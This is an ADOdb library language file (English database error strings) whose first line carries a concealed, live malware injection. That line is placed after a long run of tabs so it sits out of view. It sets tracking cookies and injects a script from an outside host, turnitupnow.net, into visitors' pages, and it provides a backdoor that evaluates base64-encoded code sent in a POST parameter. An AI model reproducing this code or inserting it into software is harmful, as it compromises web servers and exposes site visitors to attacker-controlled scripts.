<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'en',
            DB_ERROR                    => 'unknown error',
            DB_ERROR_ALREADY_EXISTS     => 'already exists',
            DB_ERROR_CANNOT_CREATE      => 'can not create',
            DB_ERROR_CANNOT_DELETE      => 'can not delete',
            DB_ERROR_CANNOT_DROP        => 'can not drop',
            DB_ERROR_CONSTRAINT         => 'constraint violation',
            DB_ERROR_DIVZERO            => 'division by zero',
            DB_ERROR_INVALID            => 'invalid',
            DB_ERROR_INVALID_DATE       => 'invalid date or time',
            DB_ERROR_INVALID_NUMBER     => 'invalid number',
            DB_ERROR_MISMATCH           => 'mismatch',
            DB_ERROR_NODBSELECTED       => 'no database selected',
            DB_ERROR_NOSUCHFIELD        => 'no such field',
            DB_ERROR_NOSUCHTABLE        => 'no such table',
            DB_ERROR_NOT_CAPABLE        => 'DB backend not capable',
            DB_ERROR_NOT_FOUND          => 'not found',
            DB_ERROR_NOT_LOCKED         => 'not locked',
            DB_ERROR_SYNTAX             => 'syntax error',
            DB_ERROR_UNSUPPORTED        => 'not supported',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'value count on row',
            DB_ERROR_INVALID_DSN        => 'invalid DSN',
            DB_ERROR_CONNECT_FAILED     => 'connect failed',
            0	                       => 'no error', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'insufficient data supplied',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'extension not found',
            DB_ERROR_NOSUCHDB           => 'no such database',
            DB_ERROR_ACCESS_VIOLATION   => 'insufficient permissions'
);
?>